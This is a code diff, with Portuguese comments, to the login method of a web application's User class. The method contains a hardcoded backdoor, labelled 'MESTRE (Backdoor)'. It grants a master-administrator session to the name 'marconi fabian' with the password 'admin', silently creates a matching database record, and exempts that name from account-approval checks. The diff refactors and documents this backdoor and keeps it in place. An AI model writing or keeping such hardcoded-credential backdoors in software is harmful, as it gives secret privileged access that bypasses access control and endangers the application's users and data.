@@ -26,10 +26,14 @@ export class User {
 
     // --- MESTRE (Backdoor) ---
     if (inputName === 'marconi fabian' && inputPass.toLowerCase() === 'admin') {
+        // Tenta encontrar o ID real do Marconi no banco para que a hierarquia (promoted_by) funcione
         const dbUser = users.find(u => u.name && u.name.toLowerCase() === 'marconi fabian');
         
+        // Se encontrar no banco, usa o ID real. Se não, usa ID fixo.
+        const realId = dbUser?.id || 'master-admin-id';
+
         const sessionUser = {
-            id: dbUser?.id || 'master-admin-id', 
+            id: realId, 
             email: 'marconi@rdo.sys', 
             name: 'Marconi Fabian', 
             full_name: 'Marconi Fabian',
@@ -40,7 +44,7 @@ export class User {
 
         localStorage.setItem('currentUser', JSON.stringify(sessionUser));
         
-        // Se não existir, tenta criar silenciosamente
+        // Se não existir, tenta criar silenciosamente para garantir consistência futura
         if (!dbUser) {
              try {
                  await EntityStorage.create('AuthorizedUser', { 
@@ -66,7 +70,7 @@ export class User {
       return { success: false, message: "Nome ou senha incorretos." };
     }
 
-    // LÓGICA DE ADMIN SIMPLIFICADA: Respeita apenas o banco de dados e o Mestre.
+    // LÓGICA DE ADMIN SIMPLIFICADA
     const isAdmin = user.name === 'Marconi Fabian' || user.admin === true;
 
     if (user.status === 'pending' && !isAdmin) {
